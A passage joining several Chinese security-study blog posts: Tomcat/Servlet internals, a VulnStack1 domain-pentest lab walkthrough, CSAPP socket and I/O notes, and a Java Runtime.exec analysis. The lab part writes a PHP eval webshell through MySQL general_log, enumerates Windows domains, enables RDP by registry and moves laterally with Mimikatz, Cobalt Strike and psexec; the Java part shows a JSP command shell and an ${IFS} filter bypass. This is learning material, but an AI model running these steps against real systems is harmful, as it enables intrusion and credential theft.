failCtxIfServletStartFails=\u0026#34;true\u0026#34; is specified if(getComputedFailCtxIfServletStartFails()) { return false; } } } } return true; } 我们再凑近点看看这个 wrapper.load() 方法： @Override public synchronized void load() throws ServletException { instance = loadServlet(); if (!instanceInitialized) { initServlet(instance); } ... ... } 我们可以本质上就是通过调用initServlet()方法进而最终调用 servlet.init() 来最终开启servlet的生命周期 private synchronized void initServlet(Servlet servlet) throws ServletException { ... ... // Call the initialization method of this servlet try { if( Globals.IS_SECURITY_ENABLED) { boolean success = false; try { Object[] args = new Object[] { facade }; SecurityUtil.doAsPrivilege(\u0026#34;init\u0026#34;, servlet, classType, args); success = true; } finally { if (!success) { // destroy() will not be called, thus clear the reference now SecurityUtil.remove(servlet); } } } else { // 开启servlet的生命周期 servlet.init(facade); } instanceInitialized = true; } ... ... } 小结 通过上面对于Java EE中的三大组件与Tomcat之间的联系，我们可以进一步的了解Tomcat是如何通过web.xml来读取由开发者定义的Servlet, Listener以及Filter的，读取之后会以各种形式被保存在 StandardContext 实例当中，在 StandardContext 启动的时候就会再被拿出来进行初始化和加载。 Tomcat_and_Servlet.drawio.png Figure 10: Tomcat与三大组件的关系\n写在最后 很长的一篇文章，或者说这个长度已经不配叫做文章了（个人感觉文章还是应该更为简洁干练一些），更像是一篇学习笔记，这也导致了一开始的目标并不明确，不知道这样一篇内容需要放多少东西进来，很多知识应该学习到什么程度，这也极大地打击了效率，应该吸取教训，精简每篇文章，这样也可以分批次提高成就感。 如果读者对于内容有任何的疑问或者对于写作有任何的意见，请您务必通过邮件告诉我，提前感谢！ 代办 Pipeline \u0026amp; Valve Reference 深入理解Tomcat（八）Container Understanding Virtual Host Concept in Tomcat Apache Tomcat 10 Architecture 详解Tomcat 配置文件server.xml 什么是静态资源，什么是动态资源 What is Static Content? What Is the AJP Protocol? Apache JServ Protocol What is AJP protocol used for? 深入理解Tomcat（八）Container JAVA设计模式之门面模式（外观模式） ","date":"2022-10-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/","title":"JavaSec - JavaWeb - Tomcat 框架以及与Servlet之间的联系"},{"content":"Internal Pentest VulnStack1 内网渗透练习 靶场搭建 搭建环境: 系统：MacosX 虚拟机：VMware Fusion 靶场信息：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 找了一圈教程都是在Windows上搭建的，不过只要了解原理，其实放到mac甚至是其他环境下也是一样的。 红日的靶场非常友好了，我们只需要将靶机从百度云下载下来解压缩，看到很多的文件不要慌，直接用vmware fusion打开vmx文件就可以开启靶机。 接下来我们就分别导入三个虚拟机，并且进行少量的配置 Windows 7 x64 将默认的网卡选择为Host Only，在vmware fusion里叫做\u0026quot;Private to my Mac\u0026quot;，即独立于mac主机本身的一个虚拟网络中； 增加一张网卡，选择为桥接，这里叫Autodetect，就是和mac在同一个内网网段中，相当于一台虚拟主机连入（存在风险，慎用，可以考虑选择另一个Host-Only的虚拟网段）； 开启虚拟机，输入密码（所有虚拟机统一为hongrisec@2019，之后不再重复）； 搜索phpstudy，开启服务（如果需要用局域网访问需要在防火墙进行修改，慎用） 配置至此完成。 Windows Server 2003 开启即可，无需做任何调整，默认静态IP为192.168.52.141。 Windows Server 2008 开启之后修改密码即可，需要复杂密码，记得要记录下来不要遗忘，默认静态IP为192.168.52.138，无需其他修改。 Figure 1: 内网渗透网络拓扑\n至此配置就结束了，别害怕，前辈们为了让工具好用做了很多努力，我们只需要站在巨人的肩膀上继续学习就可以了。 前瞻知识 如果是第一次接触这种和Windows域有关的渗透练习的话，建议还是先了解一下域的相关知识，这不仅会帮助理解复现的过程，同样重要的是这也会帮助大家解决在复现过程中出现的各种问题（靶场的设计也并不是面面俱到的，不同的环境下运行也会碰到很多未知的问题） Windows中的工作组(Work Group)、域(Domain)、域控(DC)、活动目录(AD)介绍 AD域的详细介绍 外网渗透 信息收集 老规矩先用nmap进行扫描 nmap -sS 192.168.0.104/24 Figure 2: nmap 端口扫描\n发现80端口监听http服务，直接打开网页看一下：http://192.168.0.100 : Figure 3: phpStudy探针1\nFigure 4: phpStudy 探针2\n从php探针中我们可以获取大量主机的信息，这里还用弱口令测试了数据库的连接，我们先放着，可能后续有用。 接下来用dirmap来扫一下目录： python3 dirmap.py -i \u0026#34;http://192.168.0.100\u0026#34; -lcf Figure 5: dirmap 目录爆破\n根据扫描的结果，我们访问/phpmyadmin界面，来对mysql数据库进行一些操作: 这里我们先尝试一些弱口令，实在不行再用BrupSuite爆破，例如：root, admin, 123456，发现这里直接用root:root就进去了。 getshell 那么下一步就是要想办法getshell，看到mysql自然想到可以利用 SELECT INTO DUMPFILE/OUTFILE 来写入一句话木马来获取shell。 但我们知道要使用这个语法需要满足三个条件： secure_file_priv 变量为空，或者为我们所知道的路径中，表示支持数据的导入导出； 目标目录的权限可写，mysql用户也有写入的权限； 需要目标目录的绝对路径。 那么我们先查看 secure-file-priv 的值，发现为NULL，此路不通： Figure 6: 查询secure-file-priv的值\n我们知道还有一种写入的方法就是日志法 SHOW VARIABLES LIKE \u0026#39;%general%\u0026#39;; #查看日志文件相关配置 Figure 7: 查看general_log的值\n接下来我们开启general log，并且通过之前php探针所得到的绝对路径设置log文件的地址，最后写入一句话木马： SET GLOBAL general_log = ON; # 开启general log模式 SET GLOBAL general_log_file = \u0026#39;C:/phpStudy/WWW/1.php\u0026#39;; #设置日志目录为我们想要执行的shell地址 SELECT \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39;; #直接写入shell就会被记录到日志文件中去 蚁剑连接成功 Figure 8: 蚁剑连接\n其实到这里就已经可以通过蚁剑来getshell了，但我们也可以进去再看看。 进入之后发现有cms， Figure 9: 发现cms\n尝试访问后根据公告信息进入后台， Figure 10: 进入cms\n通过修改或者增加模版文件也可以用来getshell Figure 11: 模版文件\n内网渗透 信息收集 建议一些基础的信息可以直接在get的shell中执行来获取，因为CS的beacon一个是不稳定而且返回速度也慢： ipconfig /all 查看本机ip，所在域 route print 打印路由信息 net view 查看局域网内其他主机名 arp -a 查看arp缓存 net start 查看开启了哪些服务 net share 查看开启了哪些共享 net share ipc$ 开启ipc共享 net share c$ 开启c盘共享 net use \\\\192.168.xx.xx\\ipc$ \u0026#34;\u0026#34; /user:\u0026#34;\u0026#34; 与192.168.xx.xx建立空连接 net use \\\\192.168.xx.xx\\c$ \u0026#34;密码\u0026#34; /user:\u0026#34;用户名\u0026#34; 建立c盘共享 dir \\\\192.168.xx.xx\\c$\\user 查看192.168.xx.xx c盘user目录下的文件 ​ net config Workstation 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 net user 查看本机用户列表 net user /domain 查看域用户 net localgroup administrators 查看本地管理员组（通常会有域用户） net view /domain 查看有几个域 net user 用户名 /domain 获取指定域用户的信息 net group /domain 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group 组名 /domain 查看域中某工作组 net group \u0026#34;domain admins\u0026#34; /domain 查看域管理员的名字 net group \u0026#34;domain computers\u0026#34; /domain 查看域中的其他主机名 net group \u0026#34;doamin controllers\u0026#34; /domain 查看域控制器（可能有多台） netstat -ano | find \u0026#34;3389\u0026#34; 查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows） REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 用于开启远程桌面登录 横向移动 启动CS服务端： sudo ./teamserver 192.168.0.106 password 打开客户端CS连接： java -XX:+UseParallelGC -XX:+AggressiveHeap -XX:ParallelGCThreads=4 -jar cobaltstrike.jar sleep 0 # 将心跳修改为0，方便快速获取信息（真实情况下不建议使用），默认为60s交互一次 shell systeminfo # 查看域信息，两张网卡的信息包括IP地址， net view # 扫描域中的其他计算机 我们尝试利用Mimikatz来获取当前主机上存储的密码： Figure 16: Mimikatz获取明文密码\nFigure 17: 明文密码\nFigure 18: net view查看局域网中的其他计算机\nFigure 19: 其他局域网的计算机\n最后我们使用psexec打下其他两台主机： Figure 20: 使用psexec横向穿越\n最终我们可以通过拓扑图看到整一个横向移动的过程，我们先从kali对Win7进行getshell，然后再利用CS来获取Win7中的账号密码，以及域信息，最终使用pexec来横向移动到了其他两台计算机上 Figure 22: 最终拓扑\n总结 复现是复现完了，但是其中有很多的内容都需要再具体展开来学习和研究，不过通过整一个流程还是学到了很多的知识和内容，还有就是CS太强了： 深入学习Cobalt Strike，了解使用的各种工具的用途 深入了解域以及域控制器，可以自行搭建一个域环境进行学习管理 本文有机会也需要继续改进，感觉还是有很多一笔带过甚至自己都不懂的地方 Reference Windows中的工作组(Work Group)、域(Domain)、域控(DC)、活动目录(AD)介绍 PHPmyadmin Getshell AD域的详细介绍 [网络安全/域渗透]内网安全入门靶场 vulnstack1攻略 ATT\u0026amp;CK实战-红日安全vulnstack(一) 内网渗透靶场 Vulnstack（一） 红日靶场vulnstack1 内网渗透学习 Cobalt Strike使用教程——基础篇 Cobalt Strike使用教程一 ","date":"2022-10-11T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/internal_pentest_vulnstack1/","title":"Internal Pentest VulnStack1 内网渗透练习"},{"content":"CASPP Chapter 11 Network Programming 学习笔记（不定期更新） 学习进度 Socket 套接字： 11.3.3，11.4 Web Servers: 11.5 Socket套接字 (11.3.3, 11.4) 学习契机 学习Java内存马之前，想再看看Tomcat服务器的总体框架，其中有提到socket的内容，之前学nc的时候，也提到了socket的方法，感觉不是特别熟悉，看来还得是CSAPP！ 什么是socket套接字？ 什么是socket套接字？我们经常能在网络编程，客户端与服务器的通信这样的话题中聊到socket套接字，以及其相关的方法，那么存在即有意义，我们就一起来看看什么是scoket套接字以及为什么需要socket套接字。 我们都熟悉OSI七层模型或者TCP/IP模型，知道在双方通信的过程中，数据在应用层或者高层发出之后，需要经过层层打包封装后再通过物理层发送给对方，之后再层层解析拆包，最终使接收方获取到真实的数据。以上场景是非常宏观的以及抽象的描述，简单来说，socket套接字就是其中一个环节的具体实现！ 我们知道在Internet通信的双方是可以建立连接的，这样的连接是 point-to-point 点对点的，而这个点 endpoint 就是 socket ，所以我们现在可以说socket就是用来帮助通信的双方建立连接，接收，以及发送数据的。 那我们刚才将socket是通信的具体实现又是连接的端点，那么每一个socket是首先是由 socket address 即套接字地址唯一标识的（待确认），其中： socket address又两部分组成(address:port)： IP address Port 那么一个连接，就是由一对 socket address 组成：(cliaddr:cliport, servaddr:servport) (客户端地址：客户端端口，服务端地址：服务端端口) 其中客户端的端口是由 kernel 自动分配的,我们叫做 ephemeral port (临时端口？)；同时服务端的端口就是预留端口用来表明特定的服务，比如Web服务器使用80端口，邮箱服务器使用25端口，相信大家应该对此都已经非常熟悉了。 Figure 1: 一对socket address (address:port)唯一标识一个连接\nsocket套接字具体的功能 在上一小节中我们提到了socket可以帮助建立连接以及接收和发送数据，那么具体是如何实现的呢？ 说到实现，我们就可以想到Java中的实现接口，在这里也是一样，socket套接字其实就是一个Interface 接口，那么在不同的编程语言之间都用不同的实现以及API，我们在这里就从socket interface来介绍一下socket的功能 Figure 2: Socket Interface\n观察上图我们可以发现，通信的双方被定义为 Client 客户端以及 Server 服务端，同时 open_clientfd被定义为：getaddrinfo -\u0026gt; socket -\u0026gt; connect open_listenfd被定义为：getaddrinfo -\u0026gt; socket -\u0026gt; bind -listen 在Section 10.2的学习中，我们知道了 socket 也是Linux中的一种文件类型，我们也知道了打开文件意味着分配到一个 descriptor 描述符，由此我们可以理解为，打开一个可以用于通信的 socket 文件需要满足以上步骤，接下来我们就来具体看看这些方法 getaddrinfo(\u0026hellip; \u0026hellip;) 用于帮助转换hostnames, host addresses, service names, and port numbers等参数的结构，以供后面的方法使用，这里暂时不展开了 socket(\u0026hellip; \u0026hellip;) 无论是客户端还是服务端，都需要先用 socket 方法来完成打开一个文件（详见10.1的opening files操作），同时返回一个 socket decriptor socket描述符来供应用使用 客户端socket\n完成一个客户端socket需要执行 connect(int sockfd, const struct scokaddr *addr, ...) 方法，该方法会尝试与服务端socket的地址建立连接，并且该方法会block阻塞直到连接成功或者发生错误。 服务端socket\n剩下的所有 socket 方法都是给服务端socket用的，包括 bind, listen, accept bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) : - bind() 方法会将我们之前用socket()方法创建的 socket descriptor 与 socket address地址关联起来 - 有一个问题就是为什么client socket不需要呢？ - 因为不使用 bind() 方法socket address的(IP address : port number)就会由kernel自动分配，也就是我们常见的客户端了 - 而使用了 bind() 方法就意味着我们可以指定其 socket address，也就是我们所说的服务端了 我们说Client socket是active主动的，是主动发起来连接的（connect()）;而Server socket则是被动的,是被动地等待有client等待连接的。 Kernel默认将由 socket() 方法创建的socket descriptor当作主动的socket（client），直到listen方法的出现，则会帮助kernel认出server socket listen(int sockfd, int backlog) : - listen()方法将有一个active的socket转换为passive的socket（sockfd）来监听来自客户端的连接，而backlog则代表可以连接的数量（这里我猜测nc中如果开启了-k持续连接可能与这个参数也有关系？） - 也就是将原本的 socket() 方法返回的 sockfd 转化为 listening socket, 以此来等待来自client socket的连接 int accept(int listenfd, struct sockaddr *addr, int *addrlen) : - 当server socket来自client socket发起的连接（connect()）时，就会触发accept()方法 - accept() 方法将会接收之前 listen() 方法返回的listenfd，并且绑定发起连接的client socket的地址，最后返回 connected descriptor 来与client socket之间使用I/O操作进行通信 各个file descriptors之间的关系\n上面的各种方法，都会使用以及返回各种file descriptor，是不是已经有点绕了，最后我们就一起来通过一个例子辨析一下吧 Figure 3: 各个file descriptors之间的关系\n通过socket方法创建Server socket，得到sockfd，在完成了listen()方法之后，返回得到listenfd，之后进入阻塞，等待客户端连接 通过socket方法创建Client socket，得到clientfd，使用connect()方法发起连接请求 Server socket收到连接，调用 accept 方法，返回 connfd 最终建立起 clientfd 与 connfd 两个文件之间的连接以及通信，所有的数据的传递都通过双方对于clientfd以及connfd两个文件的读写来完成 接着我们再来辨析一下由listen()方法所返回的 listening descriptor listenfd 与 accept()方法返回得到的connected descriptor connfd 之间的关系： listening descriptor是由server建立，为了client的connect()方法所服务的，一旦创建就会一直存在 connected descriptor是由server建立了，是为了直接与client的clientfd之间通过I/O操作进行通信的，每当server接受一个连接就会创建直到服务结束 最后我们以一个问题结束这一小节的学习，为什么要区分listening以及connected descriptors？ 为什么不直接用listenfd来监听连接，同时建立连接一步到位呢？ 乍一看connected descriptor多次一举，但是这个分离的设计却使一个多线程并行的服务器成为可能，server只需要使用一个listenfd来处理所有client发起的连接请求，再独立的开启 connected descriptor来进行通信即可。 TODO Web Servers Web服务器 Reference Randal E. Bryant, David R. O’Hallaron - Computer Systems. A Programmer’s Perspective [3rd ed.] (2016, Pearson) ","date":"2022-09-26T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/csapp_chapter11_learning_notes/","title":"CASPP Chapter 11 Network Programming 学习笔记（不定期更新）"},{"content":"CSAPP Chapter 10 System-Level I/O 学习笔记（不定期更新） 学习进度 10.1 Unix I/O 10.2 Files 10.1 Unix I/O 学习契机 在学习CSAPP第11章的socket套接字接口的时候，在介绍相关的方法时，提到了大量的 file descriptor 的参数，发现这个概念有点陌生了，就来复习巩固一下。这么说来我对于各种语言的文件读写一直都有一种望而却步能用就行的感觉，没有好好的学习使用过，从Unix I/O开始也可以打下一个良好的基础。 什么是I/O I/O就是Input和Output，是对于 main memory 主存与 external devices 外部设备（e.g., 硬盘，终端以及网络）之间数据的输入与输出： Input：将数据从从I/O设备中拷贝到主存中 Output：将数据从内存中拷贝到外部设备上 Unix中的I/O 关于Unix中I/O的具体实现，首先我们要了解的两个很重要的结论： 在Unix中，所有的I/O设备都是以 文件 的形式存储和操作 那么所有这些I/O操作都是通过读写这些文件来实现的 其中，Wikipedia对于I/O 设备的定义如下： \u0026ldquo;I/O devices are the pieces of hardware used by a human (or other system) to communicate with a computer \u0026hellip; Devices for communication between computers, such as modems and network cards, typically perform both input and output operations.\u0026rdquo; 了解到了这两点之后, 所有 的I/O操作就可以规范地定义为对于 文件 的几个规范性操作，也就是Interface接口: Opening files, 打开文件 触发：当一个应用想要访问操作一个I/O设备（想要输入或者输出）的时候，就会要求kernel去打开对应的代表I/O设备的文件 结果：Kernel内核会返回一个很小的正整数，我们叫做 descriptor 描述符，用来在之后对于该I/O设备文件的所有操作中，唯一标识该文件 Kernel内核会持续跟踪该打开文件的所有的信息；而应用只会跟踪返回的 descriptor 描述符 每一个运行的进程会由Linux shell通过打开三个文件开启（个人认为就是启动一个进程需要用到三种I/O设备，因此开启了这三个文件，并返回了三个描述符）： standard input (descriptor 0) 标准输入 standard output (descriptor 1) 标准输出 standard error (descriptor 2) 标准错误 Changing the current file position 改变当前文件（内容）位置 File position文件位置表示文件中下一个将要被读写的字符的位置 Kernel会维护每一个打开的文件的file position k k的初始值为0，每次有字符的读写，file position都会自增 应用也可以通过 seek 操作来显示地修改file position Reading and writing files 读写文件 Read 读文件：从一个文件中读取n bytes的数据，从该文件当前的file position k开始读，并且递增n 如果读文件超过文件的size m，则会触发 end-of-file (EOF), 值得注意的是，这是由应用自动检测到的，而不是真的有一个字符叫做EOF符 Write 写文件，同样也会递增file position k文件位置 Closing files 关闭文件 触发：当应用结束访问一个文件的时候，就会要求kernel去 close 关闭这个文件 结果：kernel会释放所有的所有该文件创建的数据结构；并且将该文件的 descriptor 描述符归还到可用的描述符池中去 当一个进程结束时，kernel会关闭所有打开的文件并且释放他们的内存资源，比如之前提到的标准输入/输出/错误文件，都会被关闭 10.2 Files 文件 学习契机 跟随10.1顺便看看 文件分类 Linux中对于不同的文件都有其所对应的分类 regular file 常规文件 一个普通文件中可以包含任意数据，根据内容存储形式的不同，我们还可以再细化为： text files, 文本文件，即只包含ASCII或者Unicode字符的文件 其中文本文件包含一串 text lines 文件行，每一行都由 newline 符号 '\\n' 结尾（Linux, Mac OSX） 再Ms Windows以及Internet协议例如HTTP中，则是使用 '\\r\\n' （0xd 0xa）表示的 因此当我们在Linux以及Mac OSX环境下阅读由MS Windows编辑的文本文件时，每行后面都会出现 \u0026lsquo;^M\u0026rsquo;，可以使用一下命令来进行清理 linux\u0026gt; perl -pi -e \u0026#34;s/\\r\\n/\\n/g\u0026#34; foo.txt binary files，二进制文件， directory 目录 目录时一个包含一组 links 链接的文件，每一个链接都对应一个文件（常规文件或者目录） 每一个目录文件至少包含两个默认链接 . (dot), 该链接指向该目录文件本身 .. (dot-dot)，该链接指向 parent directory mkdir 创建目录文件， ls 查看内容， rmdir 删除目录 socket 套接字 套接字文件用来与其他进程进行网络通信（详见11.4） 文件目录结构 Linux内核通过唯一一个目录结构来管理所有的文件，该结构是由 root directory 根目录开始的一个树状结构，用 / 来表示，因此我们在一个文件路径中开头看到 / 要知道，这是一个目录文件，和后面使用到的 / 用作分隔符的概念时不一样的 Figure 1: Linux目录结构\n每一个进程都有一个 current working directory 用来表示其在这个目录结构中的位置，通过 cd 命令可以改变shell的 current working directory 那么对应Linux目录结构，有两种形式来表达一个文件的位置（Location）： Absolute pathname, 绝对路径，表示从根目录（/）开始的路径（之后的/表示路径的分割），例如上图中的hello.c文件的绝对路径就是/home/droh/hello.c Relative pathname，相对路径，表示从一个文件名（./..也是文件名）开始，表示一个文件对于当前工作路径的相对路径，例如在上图中，我们当前的工作路径为 /home/droh,那么文件 hello.c的相对路径就是./hello.c Reference Randal E. Bryant, David R. O’Hallaron - Computer Systems. A Programmer’s Perspective [3rd ed.] (2016, Pearson) CSAPP 读书笔记：系统级 I/O GNU: File Position ","date":"2022-09-26T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/csapp_chapter10_learning_notes/","title":"CSAPP Chapter 10 System-Level I/O 学习笔记（不定期更新）"},{"content":"Java本地命令执行 Runtime 下面的命令是我们最常用到的Runtime.exec(xxx)的用法，本篇我们就从这里开始了解Java的本地命令执行 \u0026lt;% Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;)); %\u0026gt; \u0026lt;%=Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;))%\u0026gt; 看到Runtime.getRuntime()这种获取实例对象的方式我们就可以大胆猜测这是一个单例类，查看文档，果不其然：每一个Java程序都有唯一一个Runtime实例 /** * Every Java application has a single instance of class * \u0026lt;code\u0026gt;Runtime\u0026lt;/code\u0026gt; that allows the application to interface with * the environment in which the application is running. The current * runtime can be obtained from the \u0026lt;code\u0026gt;getRuntime\u0026lt;/code\u0026gt; method. * \u0026lt;p\u0026gt; * An application cannot create its own instance of this class. * * @author unascribed * @see java.lang.Runtime#getRuntime() * @since JDK1.0 */ public class Runtime { private static Runtime currentRuntime = new Runtime(); /** * Returns the runtime object associated with the current Java application. * Most of the methods of class \u0026lt;code\u0026gt;Runtime\u0026lt;/code\u0026gt; are instance * methods and must be invoked with respect to the current runtime object. * * @return the \u0026lt;code\u0026gt;Runtime\u0026lt;/code\u0026gt; object associated with the current * Java application. */ public static Runtime getRuntime() { return currentRuntime; } 其中的exec()方法却有很多的重载方法： public Process exec(String command) public Process exec(String command, String[] envp) public Process exec(String command, String[] envp, File dir) public Process exec(String cmdarray[]) public Process exec(String[] cmdarray, String[] envp) public Process exec(String[] cmdarray, String[] envp, File dir) 看到这种形式，我们大概也可以判断这些重载方法有很多的套娃，最简单的形式就是 exec(String command), 最自定义的方法那就是 exec(String[] cmdarray, String[] envp, File dir). public Process exec(String command) throws IOException { return exec(command, null, null); } public Process exec(String command, String[] envp) throws IOException { return exec(command, envp, null); } public Process exec(String command, String[] envp, File dir) throws IOException { if (command.length() == 0) throw new IllegalArgumentException(\u0026#34;Empty command\u0026#34;); StringTokenizer st = new StringTokenizer(command); String[] cmdarray = new String[st.countTokens()]; for (int i = 0; st.hasMoreTokens(); i++) cmdarray[i] = st.nextToken(); return exec(cmdarray, envp, dir); } 通过上面的套娃加上文档我们得知： String command为必要的参数，用来表明需要执行的系统命令 String[] envp为可选参数，为一个String数组，其中包含name=value格式的元素，表示环境变量设置，如果为空则默认继承当前进程的环境 File dir为可选参数，表示方法所返回的Process（子进程）对象所处的工作目录，如果为空则默认继承当前进程的工作目录 最终都会放到执行public Process exec(String[] cmdarray, String[] envp, File dir)中执行 我们注意到这里将 command 使用 StringTokenizer经过了处理转换成了字符串数组，我们就稍微来看看这个类做了什么吧 class StringTokenizer implements Enumeration\u0026lt;Object\u0026gt; { ... ... /** * Constructs a string tokenizer for the specified string. The * tokenizer uses the default delimiter set, which is * \\t\\n\\r\\f: the space character, * the tab character, the newline character, the carriage-return character, * and the form-feed character. Delimiter characters themselves will * not be treated as tokens. * * @param str a string to be parsed. * @exception NullPointerException if str is null */ public StringTokenizer(String str) { this(str, \u0026#34; \\t\\n\\r\\f\u0026#34;, false); } ... ... 首先这个类实现了 Enumeration\u0026lt;Object\u0026gt; 接口，这就能够解释生成的对象可以使用 hasMoreTokens() 以及 st.nextToken() 这种很像迭代器方法的东西，接着是这个构造器也说明了最简单的功能就是用四种分隔符将字符串进行分割。 那么如果我们的命令因为String -\u0026gt; String[]的原因被分割开不能顺利执行的时候，就可以考虑对这四种分隔符进行绕过，比如使用${IFS}来绕过空格过滤： private static void outputCommand(String cmd){ StringTokenizer st = new StringTokenizer(cmd); String[] cmdarray = new String[st.countTokens()]; for (int i = 0; st.hasMoreTokens(); i++) { cmdarray[i] = st.nextToken(); System.out.println(cmdarray[i]); } } public static void main(String[] args) { String cmd = \u0026#34;ls -la\u0026#34;; String cmdBypass =\u0026#34;ls${IFS}-la\u0026#34;; outputCommand(cmd); System.out.println(\u0026#34;Use ${IFS} to bypass:\u0026#34;); outputCommand(cmdBypass); } 结果： ls -la Use ${IFS} to bypass: ls${IFS}-la 接下来我们来具体这个最后的exec： public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException { return new ProcessBuilder(cmdarray) .environment(envp) .directory(dir) .start(); } 我们可以观察到这里返回了一个新的ProecessBuilder对象，那么就跟随进去一起看看 ProcessBuilder 在学习的ProcessBuilder的时候，本来想着再找一篇具体介绍的文章来学习一下，但是突然发现还是文档靠谱啊，从作用以及用法都会讲解一遍，非常的通俗易懂，接下来我们也来稍微一起看看吧 \u0026ldquo;This class is used to create operating system processes. Each ProcessBuilder instance manages a collection of process attributes. The start() method creates a new Process instance with those attributes. The start() method can be invoked repeatedly from the same instance to create new subprocesses with identical or related attributes.\u0026rdquo; ProcessBuidler顾名思义就是用来创建进程的类，每一个实例都会管理很多进程的属性，并用 start() 方法来启动一个新的进程。同时一个ProcessBuidler 进程构造器实例可以重复调用 start() 方法来创造子进程。 \u0026ldquo;Each process builder manages these process attributes: a command, a list of strings which signifies the external program file to be invoked and its arguments, if any. an environment, which is a system-dependent mapping from variables to values. The initial value is a copy of the environment of the current process (see System.getenv()). a working directory. The default value is the current working directory of the current process, usually the directory named by the system property user.dir. a source of standard input. By default, the subprocess reads input from a pipe. Java code can access this pipe via the output stream returned by Process.getOutputStream(). However, standard input may be redirected to another source using redirectInput. In this case, Process.getOutputStream() will return a null output stream, for which: the write methods always throw IOException the close method does nothing \u0026hellip; \u0026hellip;\u0026rdquo; 每一个进程构造器都管理着如下属性： command命令，表示该进程需要执行的命令（文件）以及相关的参数 environment 环境变量,保持我们之前提到过的格式，String[]中的所有元素都是name=value的形式 working directory 工作目录 source of standard input 标准输出源 这时候我们再来看之前的exec方法就能明白就是在设置这些属性了 public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException { return new ProcessBuilder(cmdarray) .environment(envp) .directory(dir) .start(); } 接着我们继续看用来启动进程的方法 start() public Process start() throws IOException { // Must convert to array first -- a malicious user-supplied // list might try to circumvent the security check. // 确保输入的命令是字符串数组的形式 String[] cmdarray = command.toArray(new String[command.size()]); cmdarray = cmdarray.clone(); for (String arg : cmdarray) if (arg == null) throw new NullPointerException(); // Throws IndexOutOfBoundsException if command is empty ... ... try { return ProcessImpl.start(cmdarray, environment, dir, redirects, redirectErrorStream); } catch (IOException | IllegalArgumentException e) { ... ... } } 下一步就是ProcessImpl ProcessImpl \u0026amp; UNIXProcess \u0026ldquo;This class is for the exclusive use of ProcessBuilder.start() to create new processes.\u0026rdquo; 到了ProcessImpl类就真的是用来专门用来创建线程的类了! 我们直接看start()方法，其中又套了一层娃，还得到UNIXProcess里去，不过这个是jdk9之前的做法，在jdk9+的版本里，UNIXProcess已经被合并到ProcessImpl里了，后面我们可以看到代码 Figure 1: jdk9中的更新，将UNIXProcess并入ProcessImpl\nstatic Process start(String[] cmdarray, java.util.Map\u0026lt;String,String\u0026gt; environment, String dir, ProcessBuilder.Redirect[] redirects, boolean redirectErrorStream) throws IOException { ... ... try { ... ... return new UNIXProcess (toCString(cmdarray[0]), argBlock, args.length, envBlock, envc[0], toCString(dir), std_fds, redirectErrorStream); } finally { ... ... } } 进入UNIXProcess，发现最后的方法： forkAndExec 这是一个native方法，我们之前说过，native方法就是用C语言编写的方法了 UNIXProcess(final byte[] prog, final byte[] argBlock, final int argc, final byte[] envBlock, final int envc, final byte[] dir, final int[] fds, final boolean redirectErrorStream) throws IOException { pid = forkAndExec(launchMechanism.ordinal() + 1, helperpath, prog, argBlock, argc, envBlock, envc, dir, fds, redirectErrorStream); ... ... } jdk9+ private ProcessImpl(final byte[] prog, final byte[] argBlock, final int argc, final byte[] envBlock, final int envc, final byte[] dir, final int[] fds, final boolean forceNullOutputStream, final boolean redirectErrorStream) throws IOException { pid = forkAndExec(launchMechanism.ordinal() + 1, helperpath, prog, argBlock, argc, envBlock, envc, dir, fds, redirectErrorStream); ... ... } 接下来我们动态调试一下， 参数： ?cmd=/bin/sh%20-c%20ls Figure 2: forkAndExec动态调试\nFigure 3: prog \u0026amp; argBlock的值\n其中prog的值为 \u0026ldquo;/bin/sh\u0026rdquo;,并以\u0026rsquo;\\x00\u0026rsquo;C语言的结束符号结束； 同样的argBlock的值为\u0026quot;-c ls\u0026quot;，其中也用 \u0026lsquo;\\x00\u0026rsquo; 结束符来间隔和结尾 为什么我们要一探到底？ 到此为止我们就已经探到底了，再找只能是看C语言代码了，那么问题来了，为什么我们要这样一层层找下来呢？ 原因也很简单，就是为了提供更多的反射的可能，在实际的情况中（目前是我猜的），反射会收到诸多限制，但是我们看到调用链中的一个个方法都可以是我们反射的切入点，进而执行我们想要的命令。 Runtime.exec(xxx)调用链总结 在我们看一些具体的反射的例子之前，我们再来总结一下Runtime.exec()的整一个调用链 Runtime中的六种exec()方法，一般情况下，我们只需要关心String[] cmdarray以及Strint command，主要这里会用StringTokenizer进行分割，其他两个参数可以直接填null public Process exec(String command) public Process exec(String command, String[] envp) public Process exec(String command, String[] envp, File dir) public Process exec(String cmdarray[]) public Process exec(String[] cmdarray, String[] envp) public Process exec(String[] cmdarray, String[] envp, File dir) ProcessBuilder的start()方法 new ProcessBuilder(cmdarray).start() Figure 4: Runtime.exec() \u0026amp; ProcessBuilder(cmdarray).start()\nProcessImpl \u0026amp; UNIXProcess jdk9之前 ProcessImpl.start(cmdarray, environment, dir, redirects, redirectErrorStream); Figure 5: ProcessImpl.start()参数\nnew UNIXProcess (toCString(cmdarray[0]), argBlock, args.length, envBlock, envc[0], toCString(dir), std_fds, redirectErrorStream); Figure 6: UNIXProcess + forkAndExec\njdk9+ private ProcessImpl(final byte[] prog, final byte[] argBlock, final int argc, final byte[] envBlock, final int envc, final byte[] dir, final int[] fds, final boolean forceNullOutputStream, final boolean redirectErrorStream) throws IOException { pid = forkAndExec(launchMechanism.ordinal() + 1, helperpath, prog, argBlock, argc, envBlock, envc, dir, fds, redirectErrorStream); ... ... } 反射例子 反射Runtime.exec() \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@page 